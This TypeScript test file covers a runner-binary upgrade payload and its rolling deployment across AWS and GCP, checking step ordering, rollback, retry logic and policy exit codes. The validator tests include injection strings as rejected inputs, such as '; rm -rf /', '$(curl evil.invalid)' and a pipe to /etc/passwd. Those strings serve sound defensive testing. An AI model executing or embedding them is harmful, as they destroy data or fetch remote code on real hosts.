/*
 * The in-place upgrade: the payload one host runs, and the roll that drives it.
 *
 * What is checked is the shape a person cannot see by reading the string. The
 * payload runs as root on a host holding live boxes, and the order of its steps
 * is the whole design — verify before stopping the unit, converge instead of
 * reinstalling, roll back rather than leaving a host with no binary. Each of
 * those is an ordering claim, so each is asserted as one.
 *
 * The roll is checked on the two decisions it actually makes: which errors are
 * worth another attempt, and what counts as a verdict.
 */

import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import test from 'node:test'
import { fileURLToPath } from 'node:url'
import {
  RunnerUpgradeError,
  ON_HOST,
  encodeUpgradePayload,
  renderUpgradePayload,
  renderHostConvergence,
  renderUnitEnvironmentPolicyScripts,
  renderPolicyScripts,
  upgradeResourceName,
  upgradeTrigger,
  type UpgradeTarget,
} from '../stack/runner-upgrade.ts'
import { upgradeRunner, type CommandResult } from '../src/upgrade-runners.ts'
import { runnerApiUrl } from '../stack/runner-boot.ts'

const REF = 'f'.repeat(40)
const RELEASE = 'https://github.com/boxlite-ai/boxlite/releases/download/v0.10.0'
const TARBALL = 'boxlite-runner-v0.10.0-linux-amd64.tar.gz'

const released = {
  tarballUrl: `${RELEASE}/${TARBALL}`,
  checksumUrl: `${RELEASE}/${TARBALL}.sha256`,
  tarballName: TARBALL,
  transport: 'https' as const,
  source: 'release' as const,
  identity: '0.10.0',
}

const target = (overrides: Partial<UpgradeTarget> = {}): UpgradeTarget => ({
  identity: '0.10.0',
  binary: released,
  port: 3003,
  ...overrides,
})

test('the bytes are verified before the unit is stopped', () => {
  // A failed or corrupt fetch must never take a runner down. Ordering, because
  // both steps are present either way — it is the sequence that is the claim.
  const payload = renderUpgradePayload(target())
  const verifies = payload.indexOf('runner checksum mismatch')
  const stops = payload.indexOf('systemctl stop boxlite-runner')
  assert.notEqual(verifies, -1)
  assert.ok(verifies < stops, 'verifying after stopping leaves a host down on a bad download')
  assert.match(payload, /\[ "\$EXPECTED" = "\$ACTUAL" \]/, 'the manifest digest is compared to the bytes')
  assert.match(payload, new RegExp(`${TARBALL.replace(/\./g, '\\.')}\\.sha256`), 'the manifest is fetched beside it')
})

test('a host still bootstrapping is left alone, before anything probes it', () => {
  // A fresh instance reports `running` long before cloud-init has written the
  // unit, and its boot script installs this very identity. Swapping against a
  // missing unit would fail and roll back a host that was coming up fine.
  const payload = renderUpgradePayload(target())
  const bails = payload.indexOf('still bootstrapping')
  const probes = payload.indexOf('CURRENT=$(probe_identity')
  assert.notEqual(bails, -1)
  assert.ok(bails < probes, '"not serving" here means "not built yet", which is not a repair case')
  assert.match(payload, /systemctl is-enabled --quiet boxlite-runner/, 'the last of the three to become true')
})

test('a host already serving the target is not restarted', () => {
  // What makes running this on every deploy free of gratuitous restarts.
  const payload = renderUpgradePayload(target())
  assert.match(payload, /already serving \$TARGET; leaving the unit untouched/)
  const converges = payload.indexOf('already serving $TARGET')
  const downloads = payload.indexOf('mktemp -d')
  assert.ok(converges < downloads, 'a converged host must not even fetch')
})

test('a failed swap rolls back to the binary that was serving', () => {
  const payload = renderUpgradePayload(target())
  assert.match(payload, /cp -a \/usr\/local\/bin\/boxlite-runner \/usr\/local\/bin\/boxlite-runner\.bak/)
  assert.match(payload, /mv -f \/usr\/local\/bin\/boxlite-runner\.bak \/usr\/local\/bin\/boxlite-runner/)
  const backs = payload.indexOf('boxlite-runner.bak\n  HAD_PREVIOUS=true')
  const stops = payload.indexOf('systemctl stop boxlite-runner')
  assert.ok(backs !== -1 && backs < stops, 'the backup is taken before the unit goes down')
})

test('the roll does not advance until the host reports the new identity', () => {
  // The rolling-step boundary: process-alive is not a sufficient signal, and
  // the caller only moves on when this exits 0.
  const payload = renderUpgradePayload(target())
  assert.match(payload, /wait_for_target\(\) \{/)
  assert.match(payload, /&& wait_for_target; then/)
})

test('a release will not be moved backwards, and a build has no ordering to guard', () => {
  // A host serving something newer is usually a deliberate hand-install, so it
  // is refused rather than reverted. Two commits of one checkout version are
  // neither older nor newer, so in build mode "install this commit" can only
  // mean install it.
  const release = renderUpgradePayload(target())
  assert.match(release, /refusing to downgrade \(set ALLOW_DOWNGRADE=1 to force\)/)
  assert.match(release, /cur_core=\$\{cur_core%%\+\*\}/, 'build metadata is stripped, as semver requires')

  const build = renderUpgradePayload(
    target({ identity: `0.10.0+${REF}`, binary: { ...released, source: 'build', identity: `0.10.0+${REF}` } }),
  )
  assert.doesNotMatch(build, /refusing to downgrade/)
  assert.match(build, /no ordering to guard/)
})

test('a rollback is possible, and only when it is asked for', () => {
  assert.match(renderUpgradePayload(target()), /ALLOW_DOWNGRADE=""/)
  assert.match(renderUpgradePayload(target({ allowDowngrade: true })), /ALLOW_DOWNGRADE="1"/)
})

test('each transport fetches the way it must, and a build needs its region', () => {
  // The two sources differ only in how the bytes are read: a release is public,
  // a build is an object only the host's own role may read.
  assert.match(renderUpgradePayload(target()), /curl --fail --silent --show-error --location --proto '=https'/)

  const name = `boxlite-runner-v0.10.0-${REF}-linux-amd64.tar.gz`
  const staged = {
    identity: `0.10.0+${REF}`,
    binary: {
      tarballUrl: `s3://boxlite-app-dev-artifacts/runner/${REF}/${name}`,
      checksumUrl: `s3://boxlite-app-dev-artifacts/runner/${REF}/${name}.sha256`,
      tarballName: name,
      transport: 's3' as const,
      source: 'build' as const,
      identity: `0.10.0+${REF}`,
    },
  }
  assert.match(
    renderUpgradePayload(target({ ...staged, region: 'ap-southeast-1' })),
    /aws .*s3 cp --region ap-southeast-1/,
  )
  assert.throws(() => renderUpgradePayload(target(staged)), /needs the region that bucket lives in/)
})

test('nothing unvalidated is interpolated into a script that runs as root', () => {
  // The module that emits root bash is the one that has to be sure, whatever
  // the resolver already checked.
  assert.throws(() => renderUpgradePayload(target({ identity: '0.10.0; rm -rf /' })), RunnerUpgradeError)
  assert.throws(() => renderUpgradePayload(target({ port: 0 })), /whole number from 1 to 65535/)
  // The name reaches an awk ERE and a shell, so it is checked here even though
  // `runner-binary.ts` composed it from a validated version and commit.
  assert.throws(
    () => renderUpgradePayload(target({ binary: { ...released, tarballName: 'runner.tar.gz; rm -rf /' } })),
    /reaches an awk pattern and a shell/,
  )
  assert.throws(
    () =>
      renderUpgradePayload(
        target({ binary: { ...released, transport: 's3', tarballUrl: 's3://b/k', checksumUrl: 's3://b/k.sha256' } }),
      ),
    /needs the region that bucket lives in/,
  )
})

test('the trigger is the identity and the address it came from', () => {
  // A fleet that re-ran the payload on every deploy would restart for nothing,
  // so the trigger is only what could change about the run.
  assert.equal(upgradeTrigger({ identity: '0.10.0', binary: released }), `0.10.0:${TARBALL}`)
  assert.notEqual(
    upgradeTrigger({ identity: `0.10.0+${REF}`, binary: released }),
    upgradeTrigger({ identity: '0.10.0', binary: released }),
  )
})

test('a host’s upgrade is named after the host, by its stable name', () => {
  // Not by the control-plane name: that one is `DEFAULT_RUNNER_NAME`, which a
  // stage may set to anything, so a resource keyed on it would be replaced the
  // day someone renamed a runner.
  const slot = (resourceName: string) => ({
    resourceName,
    nameTag: 'boxlite-runner',
    controlPlaneRunnerName: 'anything',
  })
  assert.equal(upgradeResourceName(slot('Runner')), 'UpgradeRunnerBinary')
  assert.equal(upgradeResourceName(slot('Runner-runner-2')), 'UpgradeRunnerBinary-runner-2')
})

// ── the roll ────────────────────────────────────────────────────────────────

const awsEnvironment = {
  RUNNER_UPGRADE_CLOUD: 'aws',
  RUNNER_UPGRADE_TARGET: 'i-0abc',
  RUNNER_UPGRADE_IDENTITY: '0.10.0',
  RUNNER_UPGRADE_PAYLOAD: encodeUpgradePayload(target()),
  AWS_REGION: 'ap-southeast-1',
}

const ok = (stdout = ''): CommandResult => ({ ok: true, status: 0, stdout, stderr: '' })
const failed = (stderr: string, status = 254): CommandResult => ({ ok: false, status, stdout: '', stderr })

test('an SSM command not yet accepted is retried, and a denied one is not', () => {
  // SendCommand is rejected with InvalidInstanceId until the agent registers,
  // and an instance reports `running` well before that. A denied permission is
  // not transient, and retrying it thirty times only hides it.
  const calls: string[][] = []
  let attempts = 0
  const run = (_file: string, args: string[]): CommandResult => {
    calls.push(args)
    if (args[1] === 'send-command') {
      attempts += 1
      return attempts < 3 ? failed('An error occurred (InvalidInstanceId)') : ok('cmd-1')
    }
    if (args.includes('Status')) return ok('Success')
    return ok('')
  }
  assert.equal(upgradeRunner({ environment: awsEnvironment, run, sleep: () => {}, log: () => {} }), 0)
  assert.equal(attempts, 3)
  assert.ok(
    calls.some((args) => args.includes('cmd-1')),
    'the accepted command id is what is polled',
  )

  assert.throws(
    () =>
      upgradeRunner({
        environment: awsEnvironment,
        run: () => failed('An error occurred (AccessDeniedException)'),
        sleep: () => {},
        log: () => {},
      }),
    /aws ssm send-command failed for i-0abc/,
  )
})

test('a non-Success terminal status fails the roll rather than continuing it', () => {
  // The whole point of chaining the commands: a failure has to stop here, with
  // the hosts not yet visited still serving the old binary.
  const run = (_file: string, args: string[]): CommandResult => {
    if (args[1] === 'send-command') return ok('cmd-1')
    if (args.includes('Status')) return ok('Failed')
    return ok('upgrade failed; rolling back')
  }
  assert.throws(
    () => upgradeRunner({ environment: awsEnvironment, run, sleep: () => {}, log: () => {} }),
    /the SSM command cmd-1 finished Failed/,
  )
})

test('an InProgress status is not a verdict', () => {
  // `aws ssm wait command-executed` gives up after 100s and treats InProgress
  // as retryable, so on a host whose upgrade legitimately runs longer it
  // returns with the command still running — reading that as a verdict would
  // abort the roll on a host that is upgrading fine.
  let polls = 0
  const run = (_file: string, args: string[]): CommandResult => {
    if (args[1] === 'send-command') return ok('cmd-1')
    if (args.includes('Status')) {
      polls += 1
      return ok(polls < 4 ? 'InProgress' : 'Success')
    }
    return ok('')
  }
  assert.equal(upgradeRunner({ environment: awsEnvironment, run, sleep: () => {}, log: () => {} }), 0)
  assert.equal(polls, 4)
})

test('on GCP an unreachable tunnel is retried and a refused payload is not', () => {
  /*
   * The discriminant is the payload's own first line, not the exit code.
   *
   * The exit code cannot carry it: `gcloud compute ssh` exits 255 for most of
   * its transport failures but not all of them — an external-organization
   * identity is refused OS Login before any session opens and gcloud exits 1,
   * which read as "the payload exited 1" and pointed a reader at a host the run
   * had never touched. Seeing `ON_HOST` in the output is what makes an exit code
   * a verdict about the runner rather than about the channel.
   */
  const gcpEnvironment = {
    RUNNER_UPGRADE_CLOUD: 'gcp',
    RUNNER_UPGRADE_TARGET: 'boxlite-runner-default',
    RUNNER_UPGRADE_IDENTITY: '0.10.0',
    RUNNER_UPGRADE_PAYLOAD: encodeUpgradePayload(target()),
    GCP_PROJECT: 'boxlite-gcp-dev',
    GCP_ZONE: 'asia-southeast1-b',
  }
  let attempts = 0
  const run = (file: string, args: string[]): CommandResult => {
    assert.equal(file, 'gcloud')
    assert.ok(args.includes('--tunnel-through-iap'), 'no inbound port is opened for a person')
    attempts += 1
    return attempts < 3
      ? failed('ssh: connect to host port 22: Connection refused', 255)
      : ok(`${ON_HOST}\nnew identity: 0.10.0`)
  }
  assert.equal(upgradeRunner({ environment: gcpEnvironment, run, sleep: () => {}, log: () => {} }), 0)
  assert.equal(attempts, 3)

  // The payload ran and refused: its exit code is the verdict.
  assert.throws(
    () =>
      upgradeRunner({
        environment: gcpEnvironment,
        run: () => ({ ok: false, status: 1, stdout: ON_HOST, stderr: 'FATAL: runner checksum mismatch' }),
        sleep: () => {},
        log: () => {},
      }),
    /the upgrade payload exited 1/,
  )
})

test('a session gcloud refuses outright is reported once, and says nothing was touched', () => {
  /*
   * The failure this was written from: an operator whose account is in a
   * different organization than the project. OS Login refuses to provision a
   * POSIX account for them until `roles/compute.osLoginExternalUser` is granted
   * on the organization that owns the VMs — and gcloud exits 1, before any
   * session exists.
   *
   * The address and the project below are placeholders. The real ones were
   * pasted in from a log, and neither an operator's name nor a live project id
   * is something a fixture needs: no assertion reads them, and both outlive
   * whoever hit the failure.
   *
   * Retrying it thirty times buries the one line that says what to grant, and
   * calling it a payload failure sends someone to a host that was never
   * reached. Both are asserted because both actually happened.
   */
  const refused =
    'ERROR: (gcloud.compute.ssh) [None] does not have permission to access users instance ' +
    '[operator@example.invalid:importSshPublicKey] (or it may not exist): Insufficient IAM permissions. ' +
    'The instance belongs to an external organization. You must be granted the ' +
    'roles/compute.osLoginExternalUser IAM role on the external organization'
  let attempts = 0
  assert.throws(
    () =>
      upgradeRunner({
        environment: {
          RUNNER_UPGRADE_CLOUD: 'gcp',
          RUNNER_UPGRADE_TARGET: 'boxlite-runner-default',
          RUNNER_UPGRADE_IDENTITY: '0.10.0',
          RUNNER_UPGRADE_PAYLOAD: encodeUpgradePayload(target()),
          GCP_PROJECT: 'boxlite-gcp-dev',
          GCP_ZONE: 'asia-southeast1-b',
        },
        run: () => {
          attempts += 1
          return { ok: false, status: 1, stdout: '', stderr: refused }
        },
        sleep: () => {},
        log: () => {},
      }),
    (error: Error) => {
      assert.match(error.message, /never reached the host/)
      assert.match(error.message, /Nothing on this runner was touched/)
      assert.match(error.message, /roles\/compute\.osLoginExternalUser/, 'the one line worth reading survives')
      return true
    },
  )
  assert.equal(attempts, 1, 'a permission that is absent is refused identically on the thirty-first attempt')
})

test('a payload that is not the base64 the stack encoded is refused', () => {
  // It reaches a shell verbatim, inside another command line.
  assert.throws(
    () =>
      upgradeRunner({
        environment: { ...awsEnvironment, RUNNER_UPGRADE_PAYLOAD: '$(curl evil.invalid)' },
        run: () => ok(),
        sleep: () => {},
        log: () => {},
      }),
    /must be the base64 the stack encoded/,
  )
})

test('a cloud with no channel here is named rather than guessed at', () => {
  assert.throws(
    () =>
      upgradeRunner({
        environment: { ...awsEnvironment, RUNNER_UPGRADE_CLOUD: 'azure' },
        run: () => ok(),
        sleep: () => {},
        log: () => {},
      }),
    /RUNNER_UPGRADE_CLOUD must be "aws" or "gcp"/,
  )
})

/*
 * The fleet is upgraded one host at a time, on both clouds.
 *
 * Read out of the two providers' own source, which is what
 * `gcp-pitfalls.test.ts` already does and for the same reason: these functions
 * build Pulumi resources, so nothing here can instantiate one and ask what it
 * depends on. The sequencing is not a property of the payload — the payload
 * above is what one host runs — it is a property of how the graph is wired, and
 * the wiring is two lines in each file.
 *
 * Worth pinning because losing it is silent and expensive. Without the previous
 * host in `dependsOn`, every `UpgradeRunnerBinary*` becomes independent, the
 * engine runs them concurrently, and a stage restarts its whole fleet at once —
 * every box in flight killed, and no failure anywhere to say why. With it, a
 * host that refuses stops the chain and the hosts not yet visited keep serving
 * the binary they have.
 *
 * Both files are read together so one cloud cannot quietly become the exception.
 */
test('each host waits on the host before it, so a fleet is never restarted at once', () => {
  /*
   * One guarantee, stated to two executors. AWS chains a command per host and
   * the dependency graph sequences them; GCP hands the fleet to the OS Config
   * agents, where the same "one at a time" is a rollout budget — there is no
   * chain to write, and asserting one would demand the shape it replaced.
   */
  const aws = readFileSync(fileURLToPath(new URL('../stack/providers/aws/runners.ts', import.meta.url)), 'utf8')
  const upgrades = aws.slice(aws.indexOf('let previousUpgrade'))
  assert.notEqual(upgrades, '', 'aws does not chain its upgrades at all')
  assert.match(
    upgrades,
    /previousUpgrade = new command\.local\.Command\(\s*upgradeResourceName\(/,
    "aws does not carry each upgrade forward as the next one's predecessor",
  )
  assert.match(
    upgrades,
    /dependsOn: \[[^\]]*\.\.\.\(previousUpgrade \? \[previousUpgrade\] : \[\]\)\]/,
    'aws does not make each upgrade wait on the previous host',
  )
  // Its own instance too: a host that does not exist has nothing to upgrade.
  assert.match(upgrades, /dependsOn: \[instance,/, 'aws does not make an upgrade wait on its own host')

  const gcp = readFileSync(fileURLToPath(new URL('../stack/providers/gcp/runners.ts', import.meta.url)), 'utf8')
  assert.match(gcp, /disruptionBudget: \{ fixed: 1 \}/, 'gcp lets the agents take the whole fleet down together')
  assert.match(gcp, /minWaitDuration: '\d+s'/, 'gcp counts a host out of the budget the moment it reports')
  assert.equal(/previousUpgrade/.test(gcp), false, 'gcp still chains commands it no longer creates')
})

test('the policy scripts answer in the exit codes the agent grades them by', () => {
  /*
   * The whole contract of an `exec` resource: 100 from `validate` means "in the
   * desired state" and `enforce` never runs; 101 is the only answer that makes
   * it run. A script that fell off its end with 0 — which is success to a shell
   * — is an *error* to the agent, and the host would be reported non-compliant
   * forever without anything being attempted.
   */
  const { validate, enforce } = renderPolicyScripts(target())

  /*
   * The shell, chosen in the file. `interpreter: SHELL` is /bin/sh — dash on
   * Ubuntu — and this payload opens with `set -euo pipefail`, which dash
   * refuses with exit 2: an execution error to the agent, so the host reports
   * UNKNOWN and the upgrade is never attempted. A real fleet reported exactly
   * that before this line existed.
   */
  assert.ok(validate.startsWith('#!/bin/bash\n'), 'validate must name its own shell')
  assert.ok(enforce.startsWith('#!/bin/bash\n'), 'enforce must name its own shell')

  // Both guards report "nothing to do", and the mismatch path is the only 101.
  assert.equal(validate.match(/^\s*exit 100$/gm)?.length, 2, 'validate must answer 100 on both guards')
  assert.match(validate, /echo "not serving [$]TARGET"\nexit 101\n$/, 'validate must end by asking for enforcement')

  // The work, graded the other way round.
  assert.match(enforce, /then exit 100; fi/, 'enforce must turn a clean run into 100')
  assert.match(enforce, /exit 101\n$/, 'and anything else into 101')
  assert.match(enforce, /bash <<'BOXLITE_RUNNER_UPGRADE'/, 'enforce must run the payload as it is, not a second copy of it')
  assert.equal(enforce.match(/^exit 101$/gm)?.length, 1, 'exactly one line turns a non-zero status into a policy failure')
  // The payload keeps its own guards, and that is the point: the agent may
  // reach enforce long after validate, and a host that converged in between
  // must still be left alone.
  assert.match(enforce, /already serving [$]TARGET; leaving the unit untouched/)
})

test('the control-plane URL is checked before it reaches a script that runs as root', () => {
  /*
   * The same rule the payload follows: the module that emits root bash is the
   * one that has to be sure, whatever composed the value. This one lands in a
   * single-quoted assignment and in a `sed` expression delimited by `|`, so a
   * quote or a pipe in it is not a malformed URL but a command.
   */
  for (const apiUrl of [
    "https://api.example.com'; rm -rf / #",
    'https://api.example.com|/etc/passwd',
    'https://api.example.com/api',
    'https://api example.com',
    'ftp://api.example.com',
    '',
  ]) {
    assert.throws(
      () => renderUnitEnvironmentPolicyScripts({ apiUrl, volumeBackend: 'gcs' }),
      RunnerUpgradeError,
      `accepted ${JSON.stringify(apiUrl)}`,
    )
  }
  // And the shapes `api.address` actually composes are taken.
  for (const apiUrl of ['https://api.boxlite.ai', 'https://api.boxlite.ai/', 'http://api.dev.boxlite.ai:8443']) {
    assert.match(renderUnitEnvironmentPolicyScripts({ apiUrl, volumeBackend: 'gcs' }).validate, /BOXLITE_API_URL=/, `refused ${apiUrl}`)
  }
})

test('the unit-environment policy answers the same exit codes, and keeps no copy of the token', () => {
  const { validate, enforce } = renderUnitEnvironmentPolicyScripts({ apiUrl: 'https://api.boxlite.ai', volumeBackend: 'gcs' })
  assert.ok(validate.startsWith('#!/bin/bash\n'), 'validate must name its own shell')
  assert.ok(enforce.startsWith('#!/bin/bash\n'), 'enforce must name its own shell')

  // Both satisfied paths — a host still bootstrapping, and one already
  // converged — answer through the same predicate, so 100 is reached from one
  // place and 101 is the only thing that asks the agent to enforce.
  assert.match(validate, /if unit_environment_settled; then exit 100; fi/)
  assert.match(validate, /still bootstrapping/)
  assert.match(validate, /already pointed at the current control plane/)
  assert.match(validate, /exit 101\n$/, 'validate must end by asking for enforcement')

  // Replace the key the file names and append the one it does not, in one pass
  // that keeps the order — and with the value as an awk variable rather than
  // inside the program, so an address carrying a pipe cannot become an
  // expression. Then put the file back when neither took.
  assert.match(enforce, /awk -v key="\$key" -v line="\$line"/, 'enforce must rewrite through awk')
  assert.match(enforce, /\{ print line; found = 1; next \}/, 'it must replace the line it found')
  assert.match(enforce, /END \{ if \(!found\) print line \}/, 'and append the one it did not')
  assert.ok(enforce.includes('mv "$UNIT_ENV_FILE.bak" "$UNIT_ENV_FILE"'), 'enforce must restore when the rewrite did not take')

  // Every expected line goes through one loop and one verdict, so a failure on
  // either reaches the restore rather than leaving the host half converged.
  assert.match(enforce, /if ! rewrite_unit_environment \|\| ! unit_environment_matches; then/)

  /*
   * The backup is a copy of the unit environment, which carries
   * BOXLITE_RUNNER_TOKEN. A converged host must not be left holding a second
   * copy of it, and the removal has to come before the restart so a failure
   * there does not leave one behind either.
   *
   * Removed on each path rather than trapped: `renderHostConvergence` puts this
   * block after the binary half, whose `swapSequence` already owns the EXIT
   * trap — and bash keeps one, so a trap here would take that one's place and
   * leave the download directory behind instead.
   */
  const lines = enforce.split('\n')
  const copied = lines.findIndex((line) => line.includes('cp -a "$UNIT_ENV_FILE" "$UNIT_ENV_FILE.bak"'))
  const removed = lines.findIndex((line) => line.includes('rm -f "$UNIT_ENV_FILE.bak"'))
  const restarted = lines.findIndex((line) => line.includes('systemctl restart boxlite-runner'))
  assert.ok(copied >= 0, 'enforce must keep a backup to restore from')
  assert.ok(removed > copied, 'and remove it once the rewrite took')
  assert.ok(removed < restarted, 'before the restart, so a failure there leaves no copy behind')
  assert.doesNotMatch(enforce, /trap .* EXIT/, 'the EXIT trap belongs to the half this block is concatenated after')

  // A converged host is a satisfied policy, through the same status translation
  // the binary's enforce uses: the block grades itself 0, and only the wrapper
  // turns that into the agent's 100.
  assert.match(
    enforce,
    /status=\$\?\nif \[ "\$status" -eq 0 \]; then exit 100; fi\nexit 101\n$/,
    'enforce must translate the block\'s own status rather than grade it twice',
  )
})

/*
 * The other thing a host cannot be told after first boot.
 *
 * `/etc/boxlite/runner.env` is written once, and the instance that holds it is
 * `protect: true` with its user data in `ignoreChanges` — so a stage that moves
 * its domain leaves every existing host calling a name that no longer resolves.
 * GCP converges it through a second resource in the one policy assignment; a
 * transport that carries a script has to carry both halves itself.
 */
test('a payload converges the unit environment as well as the binary', () => {
  const payload = renderHostConvergence(target({ apiUrl: 'https://api.dev.boxlite.ai', volumeBackend: 'gcs' }))
  const binary = payload.indexOf('upgrade_binary\n')
  const environment = payload.indexOf('converge_unit_environment\n')
  assert.notEqual(binary, -1, 'the binary half must still be called')
  assert.notEqual(environment, -1, 'and the unit environment after it')
  assert.ok(binary < environment, 'the binary leads, as the two policy resources do on GCP')
  assert.ok(
    payload.includes(`UNIT_ENV_EXPECTED=('BOXLITE_API_URL=${runnerApiUrl('https://api.dev.boxlite.ai')}' 'VOLUME_STORAGE_BACKEND=gcs')`),
    'the payload must pin the line the boot script writes, through the same function',
  )
})

test('a host already serving the target still has its environment converged', () => {
  // The case this exists for is a stage that moved its domain and nothing else:
  // every host is on the right binary, so a payload whose "already serving"
  // ended the script would converge nothing, on every host, forever.
  const payload = renderHostConvergence(target({ apiUrl: 'https://api.dev.boxlite.ai' }))
  const satisfied = payload.slice(payload.indexOf('already serving $TARGET'))
  assert.match(satisfied.split('\n')[1], /^\s*return 0$/, 'the binary half must return rather than exit')
  assert.ok(payload.indexOf('converge_unit_environment\n') > payload.indexOf('already serving $TARGET'))
})

test('a caller with no control-plane address converges only the binary', () => {
  // `runner:update` rolls a release by hand and never reads the stage's
  // environment, so it has no address to enforce — and inventing one would
  // rewrite a host from a value nobody supplied.
  const payload = renderHostConvergence(target())
  assert.doesNotMatch(payload, /converge_unit_environment/)
  assert.doesNotMatch(payload, /BOXLITE_API_URL/)
  assert.match(payload, /upgrade_binary\n$/)
})

test('an AWS host is sent both halves, and the address is what re-sends them', () => {
  // The payload is only as good as what triggers it: a domain move changes no
  // identity and no tarball, so without the address in `triggers` the command
  // that carries the fix is never re-run.
  const aws = readFileSync(fileURLToPath(new URL('../stack/providers/aws/runners.ts', import.meta.url)), 'utf8')
  const upgrades = aws.slice(aws.indexOf('let previousUpgrade'))
  assert.match(upgrades, /encodeUpgradePayload\(\{[^}]*apiUrl,/, 'the AWS payload must carry the control plane address')
  assert.match(upgrades, /triggers: \[[^\]]*request\.apiUrl,?[^\]]*\]/, 'and the address must re-send it')

  // No backend here: these hosts mount with mount-s3 and their boot script
  // writes no such key, so enforcing one would leave every host disagreeing.
  assert.doesNotMatch(upgrades, /volumeBackend/)
})
